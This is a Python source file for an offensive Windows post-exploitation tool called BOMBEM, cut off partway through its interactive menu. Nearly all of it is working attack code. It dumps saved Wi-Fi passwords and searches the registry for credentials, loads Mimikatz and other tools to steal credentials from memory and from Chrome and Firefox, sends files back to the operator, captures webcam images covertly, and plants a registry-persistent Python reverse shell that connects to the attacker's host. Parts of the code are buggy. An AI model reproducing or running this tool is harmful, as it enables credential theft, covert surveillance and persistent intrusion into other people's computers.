import socket
import os
import time
import subprocess
import cv2
import logging as log
import datetime as dt
from time import sleep


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'


class ScriptsAndMenus(object):
    # shout out to: https://github.com/D4Vinci/One-Lin3r for the one liners!
    powershell_scripts = \
        {
            "powershell/list_unqouted_services": '''gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name''',
            "powershell/list_scheduled_tasks": 'Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State',
            "powershell/list_running_processes": 'Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}}} | ft -AutoSize',
            "powershell/list_routing_tables": "Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex",
            "powershell/list_network_interfaces": "Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address",
            "powershell/list_installed_programs_using_registry": "Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name",
            "powershell/list_installed_programs_using_folders": "Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime",
            "powershell/list_arp_tables": "Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State",
            "powershell/get_saved_wifi_passwords": "(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{{ PROFILE_NAME=$name;PASSWORD=$pass }",
            "powershell/get_iis_config": "Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue",
            "cmd/search_registry_for_passwords_lm": 'REG QUERY HKLM /F "password" /t REG_SZ /S /K',
            "cmd/search_registry_for_passwords_cu": 'REG QUERY HKCU /F "password" /t REG_SZ /S /K',
            "cmd/search_for_passwords": "findstr /si password *.xml *.ini *.txt *.config",
            "cmd/read_registry_winlogon_key": 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"',
            "cmd/read_registry_vnc_passwords": 'reg query "HKCU\Software\ORL\WinVNC3\Password"',
            "cmd/read_registry_snmp_key": 'eg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"',
            "cmd/read_registry_runonce_key": "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "cmd/read_registry_run_key": "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "cmd/read_registry_r_key": "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R",
            "cmd/read_registry_putty_sessions": 'reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"',
            "cmd/read_firewall_config": "netsh firewall show state & netsh firewall show config",
            "cmd/list_users": "whoami /all",
            "cmd/list_scheduled_tasks": "schtasks /query /fo LIST 2>nul | findstr TaskName",
            "cmd/list_running_processes": "tasklist /v",
            "cmd/list_processes_running_as_system": 'tasklist /v /fi "username eq system"',
            "cmd/list_network_shares": "net share",
            "cmd/list_localgroups": "net localgroup",
            "cmd/list_drives": "wmic logicaldisk get caption,description,providername",
            "cmd/get_snmp_config": "reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s",
            "cmd/get_saved_wifi_passwords": '''cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on''',
            "cmd/get_saved_wifi_aps_ssid": "netsh wlan show profile",
            "cmd/get_architecture": "wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%"
        }
    help_menu = \
        f"""
{Colors.blue}NAME         DESCRIPTION{Colors.end}
----         -----------
modules      {Colors.green}display modules you can use{Colors.end}
privs        {Colors.green}display current privileges{Colors.end}
processes    {Colors.green}display all current processes running{Colors.end}
use (module) {Colors.green}use a module{Colors.end}
options      {Colors.green}show the options for that module{Colors.end}
back         {Colors.green}back out of a module{Colors.end}
scripts      {Colors.green}display a list of powershell scripts{Colors.end}
cmd (cmd)    {Colors.green}execute a command{Colors.end}
"""
    modules = \
        f"""
{Colors.blue}MODULE                                        DESCRIPTION{Colors.end}
------                                        -----------
upload_file                                   {Colors.green}upload a file from your computer to the one you're on now{Colors.end}
file_download                                 {Colors.green}download a file from the machine you're on now{Colors.end}
enumerate                                     {Colors.green}enumerate the system and network{Colors.end}
google_chrome_dump_credentials                {Colors.green}dump credentials from the chrome browser and output it to a file{Colors.end}
firefox_dump_credentials                      {Colors.green}dump credentials from firefox{Colors.end}
mimikatz_dump_credentials                     {Colors.green}dump passwords from memory (including kerberos tickets and others){Colors.end}
webcam_capture                                {Colors.green}take a picture from the webcam and save it to an image file{Colors.end}
escalate_privileges                           {Colors.green}uses 2 different windows privilege escalation checkers{Colors.end}
registry_persistence                          {Colors.green}creates a constant reverse shell in the registry creating good persistence{Colors.end}
"""
    scripts_menu = \
        f"""{Colors.blue}
VARIABLE                                                     DESCRIPTION{Colors.end}
________                                                     ___________
powershell/list_unqouted_services                            {Colors.green}Quering wmi to search for unquoted services paths so you can exploit it later{Colors.end}
powershell/list_scheduled_tasks                              {Colors.green}List all Scheduled tasks{Colors.end}
powershell/list_running_processes                            {Colors.green}Querying wmi from powershell to get all running processes{Colors.end}
powershell/list_routing_tables                               {Colors.green}List current routing table{Colors.end}
powershell/list_network_interfaces                           {Colors.green}List all network interfaces and IP{Colors.end}
powershell/list_installed_programs_using_registry            {Colors.green}List all installed programs from registry{Colors.end}
powershell/list_installed_programs_using_folders             {Colors.green}List all installed programs depending on program files folders{Colors.end}
powershell/list_arp_tables                                   {Colors.green}List the ARP table{Colors.end}
powershell/get_saved_wifi_passwords                          {Colors.green}One liner to grab all clear text WiFi passwords{Colors.end}
powershell/get_iis_config                                    {Colors.green}Get IIS Web config{Colors.end}
cmd/search_registry_for_passwords_lm                         {Colors.green}Search registry local machine tree for 'password' string{Colors.end}
cmd/search_registry_for_passwords_cu                         {Colors.green}Search registry current user tree for 'password' string{Colors.end}
cmd/search_for_passwords                                     {Colors.green}Search for passwords in file contents{Colors.end}
cmd/read_registry_winlogon_key                               {Colors.green}Query the Local machine winlogon key from the registry for windows autologin{Colors.end}
cmd/read_registry_vnc_passwords                              {Colors.green}Query vnc key from the registry to get vnc credentials ofc{Colors.end}
cmd/read_registry_snmp_key                                   {Colors.green}Query the Local machine snmp key from the registry to get snmp parameters{Colors.end}
cmd/read_registry_runonce_key                                {Colors.green}Query run once key from the registry for the current user ofc{Colors.end}
cmd/read_registry_run_key                                    {Colors.green}Query run key from the registry for the current user ofc{Colors.end}
cmd/read_registry_r_key                                      {Colors.green}Query the Local machine R key from the registry{Colors.end}
cmd/read_registry_putty_sessions                             {Colors.green}Query putty key from the registry to get putty clear text proxy credentials{Colors.end}
cmd/read_firewall_config                                     {Colors.green}List firewall state and current configuration using netsh{Colors.end}
cmd/list_users                                               {Colors.green}List all users with whoami{Colors.end}
cmd/list_scheduled_tasks                                     {Colors.green}List all Scheduled tasks using schtasks{Colors.end}
cmd/list_running_processes                                   {Colors.green}Get running processes{Colors.end}
cmd/list_processes_running_as_system                         {Colors.green}Get processes that's running as system{Colors.end}
cmd/list_network_shares                                      {Colors.green}List all network shares{Colors.end}
cmd/list_localgroups                                         {Colors.green}List all local groups{Colors.end}
cmd/list_drives                                              {Colors.green}List all drives using wmic{Colors.end}
cmd/get_snmp_config                                          {Colors.green}Get current SNMP Configuration{Colors.end}
cmd/get_saved_wifi_passwords                                 {Colors.green}One liner to grab all cleartext WiFi passwords{Colors.end}
cmd/get_saved_wifi_aps_ssid                                  {Colors.green}One liner to find all aps ssid{Colors.end}
cmd/get_architecture                                         {Colors.green}Extracts windows architecture with wmic{Colors.end}
"""


class WindowsExtraction(object):
    def __init__(self, local_file):
        self.local_file = local_file

    # this function here will upload a file from YOUR computer back to the computer you are currently attacking so it
    #  would basically be you running this function than going back to your computer and running python3
    #   scripts/file-transfer/client-file-download.py -p 9000 -l localhost -f new.txt
    def fileDownload(self, local_host, local_port):
        try:
            print(
                "[%s*%s] go to file-transfer/client-file-download.py\n" % (
                    Colors.green, Colors.end))
            sock = socket.socket()
            sock.bind((str(local_host), int(local_port)))
            sock.listen(1)
            connection, a = sock.accept()
            # the local_file will be the new name to receive the file under
            file_to_download = open(self.local_file, "wb")
            print(f"\r[{Colors.green}*{Colors.end}] Receiving...", end="")
            while True:
                data = connection.recv(1024)
                if data == b"DONE":
                    print("[%s*%s] Done Receiving" % (Colors.green, Colors.end))
                    print("[%s*%s] you Can Exit Now" % (Colors.green, Colors.end))
                    break
                file_to_download.write(data)
            file_to_download.close()
            connection.shutdown(2)
            connection.close()
            sock.close()
        except (socket.error, KeyboardInterrupt, ConnectionError) as error:
            print(error)
            quit()

    # this function here will select a file from the machine you're on at the moment and then
    #  you can listen & download with file-transfer/server-file-receive.py
    #   usage: python3 scripts/file-transfer/server-file-receive.py -l localhost -p 9000 -f filename.txt
    def fileUpload(self, remote_host, remote_port):
        try:
            sock = socket.socket()
            sock.connect((remote_host, int(remote_port)))
            filetosend = open(self.local_file, "rb")
            data = filetosend.read(1024)
            print("[%s*%s] Sending File Over To: %s" % (Colors.green, Colors.end, remote_host))
            while data:
                sock.send(data)
                data = filetosend.read(1024)
            filetosend.close()
            sock.send(b"DONE")
            print("[%s*%s] Done Sending" % (Colors.green, Colors.end))
            print(sock.recv(1024))
            sock.shutdown(2)
            sock.close()
        except (socket.error, KeyboardInterrupt, ConnectionError) as error:
            print(error)
            quit()

    # this function will attempt to enumerate the system as much as possible and then save results to a file
    #  NOTE: this could be loud, if you're in a scenario where there is an active system administrator looking this may not
    #   be the best idea, however if there is no system admin or there is little to no administration then it would just fine
    #    PS: its only loud because its running a lot of commands at one time
    def sys_enumeration(self, timeout, out_file):
        enumeration_cmds = \
            {
                1: "echo 'SYSTEM INFORMATION:' && echo . && systeminfo && echo 'NETWORK INFORMATION:' && echo . && ipconfig /all && echo 'CONNECTED DEVICES:' && echo . && net view",
                2: "echo 'MAC ADDRESS(S):' && getmac && echo . && echo 'ALL DEVICES CONNECTED TO THE NETWORK:' echo . && arp -a && echo 'ACTIVE CONNECTIONS' && echo . && netstat -a"}
        if out_file is True:
            with open(self.local_file, "w+") as file:
                first_wave = subprocess.check_output(enumeration_cmds[1], shell=True)
                second_wave = subprocess.check_output(enumeration_cmds[2], shell=True)
                file.write(str(first_wave.decode("utf-8")))
                file.write(str(second_wave.decode("utf-8")))
                time.sleep(int(timeout))
                file.close()
        elif out_file is False:
            subprocess.call(enumeration_cmds[1], shell=True)
            subprocess.call(enumeration_cmds[2], shell=True)
        else:
            time.sleep(timeout)

    # it first starts a listener to receive the remote powershell script to dump the chrome passwords and credentials
    #  than it will execute the script looping through the code until it finishes out putting it to a file of your choice
    #   after that it just prints done downloaded credentials to file of your choice
    def CHROME_dumpCredentials(self, timeout, loc_host, loc_port):
        input(
            "[%s*%s] before running this go back to your computer and run: python3 scripts/file-transfer/client-file-download.py -p <local port> -l <local host> -f scripts/PS-scripts/Get-ChromeDump.ps1\n[press enter if done]" % (
                Colors.green, Colors.end))
        download = WindowsExtraction(local_file="Get-ChromeDump.ps1")
        download.fileDownload(local_host=loc_host, local_port=loc_port)
        subprocess.call(f'{os.getcwd() + "/"}Get-ChromeDump.ps1 -OutFile "{self.local_file}"', shell=True)
        print(f"[%s*%s] DONE... downloaded credentials to {self.local_file}" % (Colors.green, Colors.end))
        time.sleep(timeout)

    # the firefox dump credentials function requires 5 function given variables with that it'll connect back
    #  to your computer download dumpzilla.py select a firefox profile to enumerate an output with true / false
    #   value, so from there it'll execute and provide firefox credentials
    def FIREFOX_dumpCredentials(self, firefox_profile_full_path, lo_host, lo_port, output, dumpzilla_path):
        timeout = 2
        input(
            "[%s*%s] before running this go back to your computer and run: python3 scripts/file-transfer/client-file-download.py -p <local port> -l <local host> -f scripts/dumpzilla.py\n[press enter if done]" % (
                Colors.green, Colors.end))
        if output is True:
            try:
                download = WindowsExtraction(local_file=dumpzilla_path)
                download.fileDownload(local_host=lo_host, local_port=lo_port)
            except socket.error as message:
                print(message)
            results = subprocess.check_output(
                f"python3 dumpzilla.py {firefox_profile_full_path} --Passwords --Session --Preferences --Certoverride --Addons",
                shell=True).decode("utf-8")
            with open(self.local_file, "w+") as file:
                file.write(str(results))
                file.close()
                print("[%s*%s] DONE" % (Colors.green, Colors.end))
                subprocess.call("rm dumpzilla.py", shell=True)

        elif output is False:
            try:
                download = WindowsExtraction(local_file=dumpzilla_path)
                download.fileDownload(local_host=lo_host, local_port=lo_port)
            except socket.error as message:
                print(message)
            results = subprocess.check_output(
                f"python3 dumpzilla.py {firefox_profile_full_path} --Passwords --Session --Preferences --Certoverride --Addons",
                shell=True).decode("utf-8")
            print(str(results))
        else:
            time.sleep(timeout)

    # determines if the outfile is true or false (this will determine if it will output the credentials to a file or not)
    #  it will than download mimikatz off YOUR computer which will be located in the BOMBEM directory
    #   after that it will invoke mimikatz and run it extracting credentials
    @staticmethod
    def extractCredentials(output_file, your_host, your_port, save_file):
        if output_file is False:
            input(
                "[%s*%s] 1. go to 'scripts/file-transfer/server-file-receive.py' in BOMBEM (on your computer)\n2. python3 scripts/file-transfer/server-file-receive.py -l <local host> -p <local port> scripts/Invoke-Mimikatz.ps1\n [Press Enter When Done]" % (
                    Colors.green, Colors.end))
            try:
                sock = socket.socket()
                sock.connect((your_host, int(your_port)))
                filetosend = open("Invoke-Mimikatz.ps1", "rb")
                data = filetosend.read(1024)
                print(f"[%s*%s] Sending..." % (Colors.green, Colors.end))
                while data:
                    sock.send(data)
                    data = filetosend.read(1024)
                filetosend.close()
                sock.send(b"DONE")
                print(sock.recv(1024))
                sock.shutdown(2)
                sock.close()
                print("[%s*%s] DONE" % (Colors.green, Colors.end))
            except (socket.error, KeyboardInterrupt, ConnectionError) as error:
                print(error)
                quit()
            subprocess.call("Invoke-Mimikatz.ps1", shell=True)
        elif output_file is True:
            input(
                "[%s*%s] 1. go to 'scripts/file-transfer/server-file-receive.py' in BOMBEM (on your computer)\n2. python3 scripts/file-transfer/server-file-receive.py -l <local host> -p <local port> scripts/Invoke-Mimikatz.ps1\n [Press Enter When Done]" % (
                    Colors.green, Colors.end))
            try:
                sock = socket.socket()
                sock.connect((your_host, int(your_port)))
                filetosend = open("Invoke-Mimikatz.ps1", "rb")
                data = filetosend.read(1024)
                print(f"[%s*%s] Sending..." % (Colors.green, Colors.end))
                while data:
                    sock.send(data)
                    data = filetosend.read(1024)
                filetosend.close()
                sock.send(b"DONE")
                print(sock.recv(1024))
                sock.shutdown(2)
                sock.close()
                print("[%s*%s] DONE" % (Colors.green, Colors.end))
            except (socket.error, KeyboardInterrupt, ConnectionError) as error:
                print(error)
                quit()
            subprocess.call("Invoke-Mimikatz.ps1 > %s", shell=True % save_file)
        else:
            print("[%s-%s] outfile must be described true / false" % (Colors.red, Colors.end))

    # webcam extraction function will, you guessed it! take a picture of the webcam
    #  once it's done taking a picture it will than save the output to a file of your choice
    #   after that you will see the image saved in whatever directory you are currently in (it also has facial recognition)
    def WebcamExtraction(self):
        # thanks to: https://stackoverflow.com/questions/34588464/python-how-to-capture-image-from-webcam-on-click-using-opencv for the example
        try:
            cascPath = "haarcascade_frontalface_default.xml"
            faceCascade = cv2.CascadeClassifier(cascPath)
            log.basicConfig(filename='webcam.log', level=log.INFO)
            video_capture = cv2.VideoCapture(0)
            anterior = 0
            while True:
                if not video_capture.isOpened():
                    print("[%s-%s] Unable to load camera" % (Colors.red, Colors.end))
                    sleep(5)
                    pass
                ret, frame = video_capture.read()
                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                faces = faceCascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))
                for (x, y, w, h) in faces:
                    cv2.rectangle(frame, (x, y), (x + w, y + h), (0, 255, 0), 2)
                if anterior != len(faces):
                    anterior = len(faces)
                    log.info("faces: " + str(len(faces)) + " at " + str(dt.datetime.now()))
                cv2.imshow('Video', frame)
                if cv2.waitKey(1) & 0xFF == ord('s'):
                    check, frame = video_capture.read()
                    cv2.imshow("Capturing", frame)
                    cv2.imwrite(filename=self.local_file, img=frame)
                    video_capture.release()
                    img_new = cv2.imread(self.local_file, cv2.IMREAD_GRAYSCALE)
                    img_new = cv2.imshow("Captured Image", img_new)
                    cv2.waitKey(1650)
                    print("[%s*%s] Image Saved" % (Colors.green, Colors.end))
                    print("[%s+%s] Program End" % (Colors.purple, Colors.end))
                    cv2.destroyAllWindows()
                    break
                elif cv2.waitKey(1) & 0xFF == ord('q'):
                    print("[%s-%s] Turning off camera " % (Colors.red, Colors.end))
                    video_capture.release()
                    print(f"[%s+%s] Program ended" % (Colors.purple, Colors.end))
                    cv2.destroyAllWindows()
                    break
                cv2.imshow("Video", frame)
            video_capture.release()
            cv2.destroyAllWindows()
        except (KeyboardInterrupt, ConnectionError, FileNotFoundError) as error:
            print("[%s-%s] ERROR: %s" % (Colors.red, Colors.end, error))


class PostExploitation(object):
    def __init__(self, r_host, r_port):
        self.r_host = r_host
        self.r_port = r_port

    # this function here will download a picture off your machine (scripts/PS-scripts/PrivescCheck.ps1)
    #  it will than proceed to close the sockets (close and shutdown), it will execute the powershell script
    #   than will determine what exploits the machine is vulnerable to if any
    def PrivilegeEscalationChecker(self, filename):
        try:
            print(
                "[%s*%s] go to file-transfer/client-file-download.py\n python3 client-file-download.py -l <target upload ip> -p <r port> -l scripts/PS-scripts/PrivescCheck.ps1" % (
                    Colors.green, Colors.end))
            sock = socket.socket()
            sock.bind((str(self.r_host), int(self.r_port)))
            sock.listen(1)
            connection, a = sock.accept()
            file_to_download = open(filename, "wb")
            print(f"\r[{Colors.green}*{Colors.end}] Receiving...", end="")
            while True:
                data = connection.recv(1024)
                if data == b"DONE":
                    print("[%s*%s] Done Receiving" % (Colors.green, Colors.end))
                    print("[%s*%s] you Can Exit Now" % (Colors.green, Colors.end))
                    break
                file_to_download.write(data)
            file_to_download.close()
            connection.shutdown(2)
            connection.close()
            sock.close()
        except (socket.error, KeyboardInterrupt, ConnectionError) as error:
            print(error)
            quit()
        try:
            subprocess.call("%s" % filename, shell=True)
        except (PermissionError, InterruptedError) as ERR:
            print(ERR)

    # this function will edit certain things inside the registry in order to maintain persistence through out your
    #  engagement with the target machine, but before editing the keys it will determine whether to upload a payload by you
    #   or upload a normal python reverse shell, this function is amazing for maintaining persistence
    @staticmethod  # ( you can also add your own registry key)
    def RegistryPersistence(registry_key, copy_name, local_host, local_port, add_new):
        if registry_key is False:
            resistance_payload = f"""
import os
import subprocess
import shutil
import sys
file_location = os.environ['appdata'] + '\\' + {copy_name}
try:
    if not os.path.exists(file_location):
    shutil.copyfile(sys.executable, file_location)
    subprocess.call("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v " + " /t REG_SZ /d '" + file_location + "'", shell=True)
except Exception as e:
    print(e)
subprocess.call(f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{local_host}",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''', shell=True)"""
            file = open("executableHEHE.py", "w")
            file.write(resistance_payload)
            file.close()
            subprocess.call(f"pyinstaller executableHEHE.py", shell=True)
            subprocess.call("executableHEHE.exe", shell=True)
        elif registry_key is True:
            resistance_payload = f"""
import os
import subprocess
import shutil
import sys
file_location = os.environ['appdata'] + '\\' + {copy_name}
try:
    if not os.path.exists(file_location):
        shutil.copyfile(sys.executable, file_location)
        subprocess.call("reg add {add_new} /v " + " /t REG_SZ /d '" + file_location + "'", shell=True)
except Exception as e:
    print(e)
subprocess.call(f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{local_host}",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''', shell=True)"""
            file = open("executableHEHE.py", "w")
            file.write(resistance_payload)
            file.close()
            subprocess.call(f"pyinstaller executableHEHE.py", shell=True)
            subprocess.call("executableHEHE.exe", shell=True)
        else:
            print("[%s-%s] registry key must be defined" % (Colors.red, Colors.end))


def interaction():  # this is the cli for BOMBEM (windows)
    while True:
        windows_bombem = input(f"%s({os.getcwd()})%s [BOMBEM]~:#" % (Colors.red, Colors.end))
        if windows_bombem == "modules":
            print(ScriptsAndMenus.modules)
        elif windows_bombem == "help" or windows_bombem == "?":
            print(ScriptsAndMenus.help_menu)
        elif windows_bombem == "clear":
            os.system("cls")
        elif windows_bombem == "scripts":
            print(ScriptsAndMenus.scripts_menu)
        elif windows_bombem[:2] == "os":
            command = windows_bombem[3:]
            subprocess.call(command, shell=True)

        def running_modules():
            global l_host, new_file, l_port, wanted_file, out_file_char, filename_char, outfile, file_path, profile, reg_default, exe_name, key
            if windows_bombem == "use upload_file":
                options_menu = \
                    f"""{Colors.blue}
VARIABLE                DESCRIPTION{Colors.end}
________                ___________
local_host              the ip address of this computer
local_port              the port you want to open on this machine to receive the file on
filename                the new filename you want to save the downloaded file under

(examples)
    set local_host 127.0.0.1
    set local_port 9000
    set filename new.rb
    run
"""
                length_computer_vars = len("set local_host ")
                name_of_file = len("set filename ")
                while True:
                    upload_file_module = input("%s(upload file module)%s [BOMBEM]:~#" % (Colors.red, Colors.end))
                    if upload_file_module == "options":
                        print(options_menu)
                    elif upload_file_module == "back" or upload_file_module == "exit":
                        break
                    elif "set local_host " in upload_file_module:
                        l_host = upload_file_module[length_computer_vars:]
                        print(f"local host: {l_host}")
                    elif "set local_port " in upload_file_module:
                        l_port = upload_file_module[length_computer_vars:]
                        print(f"local port: {l_port}")
                    elif "set filename " in upload_file_module:
                        new_file = upload_file_module[name_of_file:]
                        print(f"filename: {new_file}")
                    elif upload_file_module == "run":
                        upload_file_now = WindowsExtraction(local_file=new_file)
                        upload_file_now.fileDownload(local_host=l_port, local_port=l_host)
            elif windows_bombem == "use file_download":
                while True:
                    download_menu = \
                        f"""{Colors.blue}
VARIABLES                     DESCRIPTION{Colors.end}
_________                     ___________
remote_host                    the ip address of your computer to send the local file back to
remote_port                    the port you want to open on your computer to receive the file
filename                      the name of the file you want to send back

(examples)
    set local_host 127.0.0.1
    set local_port 9999
    set filename credentials.txt
    run"""
                    windows_file_download = input("%s(file download)%s [BOMBEM]:~#" % (Colors.green, Colors.end))
                    if windows_file_download == "back" or windows_file_download == "exit":
                        break
                    elif windows_file_download == "options":
                        print(download_menu)
                    elif "set remote_host " in windows_file_download:
                        l_host = windows_file_download[16:]
                        print("remote_host: " + l_host)
                    elif "set remote_port " in windows_file_download:
                        l_port = windows_file_download[15:]
                        print("remote_port: " + l_port)
                    elif "set filename " in windows_file_download:
                        wanted_file = windows_file_download[13:]
                        print("filename: " + wanted_file)
                    if windows_file_download == "run":
                        download = WindowsExtraction(local_file=wanted_file)
                        download.fileUpload(remote_host=l_port, remote_port=l_host)
            elif windows_bombem == "use enumerate":
                while True:
                    enumeration_menu = \
                        f"""{Colors.blue}
VARIABLES                       DESCRIPTION{Colors.end}
_________                       ___________
set outfile                     set the outfile variable to true or false if you want to put the information into an outfile
set filename                    only define this variable if you are setting the outfile to true (specify it with a filename)
(example)
    set outfile true / false
    set filename out.txt
    run
"""
                    enumerate_module = input("%s(enumeration module)%s [BOMBEM]:~#" % (Colors.red, Colors.end))
                    if enumerate_module == "back" or enumeration_menu == "exit":
                        break
                    elif enumerate_module == "options":
                        print(enumeration_menu)
                    elif "set outfile " in enumerate_module:
                        out_file_char = enumerate_module[12:]
                        print("outfile: " + out_file_char)
                    elif "set filename " in enumerate_module:
                        filename_char = enumerate_module[13:]
                        print("filename: " + filename_char)
                    elif out_file_char == "true" or out_file_char == "True" or out_file_char == "TRUE":
                        run_enumeration = WindowsExtraction(local_file=filename_char)
                        run_enumeration.sys_enumeration(out_file=True, timeout=3)
                    elif out_file_char == "false" or out_file_char == "False" or out_file_char == "FALSE":
                        run_enumeration = WindowsExtraction(local_file="")
                        run_enumeration.sys_enumeration(out_file=False, timeout=3)
            elif windows_bombem == "use google_chrome_dump_credentials":
                file_name_length = len("set filename ")
                my_local_h_length = len("set my_local_host ")
                my_local_p_length = len("set my_local_port ")
                while True:
                    chrome_dump_options = \
                        f"""{Colors.blue}
VARIABLES                          DESCRIPTION{Colors.end}
_________                          ___________
filename                           filename to save credentials to
my_local_host                      the local host of YOUR computer not the one your on right now (to download the powershell script)
my_local_port                      the local port that you want to open to transfer the file

(example)
    set filename creds.txt
    set my_local_host 127.0.0.1
    set my_local_port 9999
    run
"""
                    chrome_dump_module = input(
                        "%s(google chrome dump credentials module)%s [BOMBEM]:~#" % (Colors.red, Colors.end))
                    if chrome_dump_module == "options":
                        print(chrome_dump_options)
                    elif chrome_dump_module == "back" or chrome_dump_module == "exit":
                        break
                    elif "set filename " in chrome_dump_module:
                        new_file = chrome_dump_module[file_name_length:]
                        print("filename: %s" % new_file)
                    elif "set my_local_host " in chrome_dump_module:
                        l_host = chrome_dump_module[my_local_h_length:]
                        print("my_local_host: %s" % l_host)
                    elif "my_local_port " in chrome_dump_module:
                        l_port = chrome_dump_module[my_local_p_length:]
                        print("my_local_port: %s" % l_port)
                    elif chrome_dump_module == "run":
                        dump_chrome = WindowsExtraction(local_file=new_file)
                        dump_chrome.CHROME_dumpCredentials(loc_host=l_host, loc_port=l_port, timeout=2)
            elif windows_bombem == "use firefox_dump_credentials":
                windows_location_dumpzilla = 'C:\\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\\xxxx.default'
                firefox_length = len("set firefox_profile ")
                local_host_length = len("set local_host ")
                local_port_length = len("set local_port ")
                output_file_length = len("set output_file ")
                filename_length = len("set filename ")
                dumpzilla_path_length = len("dumpzilla_path ")
                while True:
                    firefox_dump_options = \
                        f"""
VARIABLES                                      DESCRIPTION
_________                                      ___________
firefox_profile                                full path to firefox profile to dump credentials dump
local_host                                     local host of YOUR computer for file transfer
local_port                                     local port of YOUR computer to open and transfer a file through
output_file                                    set this value to true or false depending if you want to output the results to a file
filename                                       ONLY set this variable if your output_file variable is true (this takes a file name to save to)
dumpzilla_path                                 local full path on YOUR computer of dumpzilla.py (scripts/dumpzilla.py)

(examples)
    set firefox_profile {windows_location_dumpzilla}
    set local_host 127.0.0.1
    set local_port 9999
    set output_file true / false
    set filename out.txt
    set dumpzilla_path /home/user/Desktop/scripts/dumpzilla.py
    run
"""
                    firefox_dump_module = input("%s(firefox dump credentials)%s [BOMBEM]:~#" % (Colors.red, Colors.end))
                    if firefox_dump_module == "exit" or firefox_dump_module == "back":
                        break
                    elif firefox_dump_module == "options":
                        print(firefox_dump_options)
                    elif "set firefox_profile " in firefox_dump_module:
                        profile = firefox_dump_module[firefox_length:]
                        print("firefox profile: %s" % profile)
                    elif "set local_host " in firefox_dump_module:
                        l_host = firefox_dump_module[local_host_length:]
                        print("local host: %s" % l_host)
                    elif "set local_port " in firefox_dump_module:
                        l_port = firefox_dump_module[local_port_length:]
                        print("local port: %s" % l_port)
                    elif "set output_file " in firefox_dump_module:
                        outfile = firefox_dump_module[output_file_length:]
                        print("outfile: %s" % outfile)
                    elif "set filename " in firefox_dump_module:
                        new_file = firefox_dump_module[filename_length:]
                        print("filename: %s" % new_file)
                    elif "set dumpzilla_path " in firefox_dump_module:
                        file_path = firefox_dump_module[dumpzilla_path_length:]
                        print("dumpzilla_path: %s" % file_path)
                    elif outfile == "true" or outfile == "True" or outfile == "TRUE" and firefox_dump_module == "run":
                        dump_firefox_creds = WindowsExtraction(local_file=new_file)
                        dump_firefox_creds.FIREFOX_dumpCredentials(dumpzilla_path=file_path, lo_host=l_host,
                                                                   lo_port=l_port,
                                                                   output=True, firefox_profile_full_path=profile)
                    elif outfile == "false" or outfile == "False" or outfile == "FALSE" and firefox_dump_module == "run":
                        dump_firefox_creds = WindowsExtraction(local_file="")
                        dump_firefox_creds.FIREFOX_dumpCredentials(dumpzilla_path=file_path, lo_host=l_host,
                                                                   lo_port=l_port,
                                                                   output=False, firefox_profile_full_path=profile)
            elif windows_bombem == "use mimikatz_dump_credentials":
                remote_host_length = len("set remote_host ")
                remote_port_length = len("set remote_port ")
                output_file_length = len("set output_file ")
                filename_length = len("set filename ")
                while True:
                    mimikatz_options = \
                        f"""{Colors.blue}
VARIABLES                            DESCRIPTION{Colors.end}
_________                            ___________
output_file                          set this value to true or false depending if you want to output the results to a file
filename                             ONLY set this variable if your output_file variable is true (this takes a file name to save to)
remote_host                          the ip address of your computer to download the invoke mimikatz script off the BOMBEM/scripts directory
remote_port                          the port of your computer you want to make the transfer on
"""
                    mimikatz_module = input("%s(mimikatz extract credentials)%s [BOMBEM]:~#" % (Colors.red, Colors.end))
                    if mimikatz_module == "options":
                        print(mimikatz_options)
                    elif mimikatz_module == "exit" or mimikatz_module == "back":
                        break
                    elif "set remote_host " in mimikatz_module:
                        l_host = mimikatz_module[remote_host_length:]
                        print("remote_host: %s" % l_host)
                    elif "set remote_port " in mimikatz_module:
                        l_port = mimikatz_module[remote_port_length:]
                        print("local port: %s" % l_port)
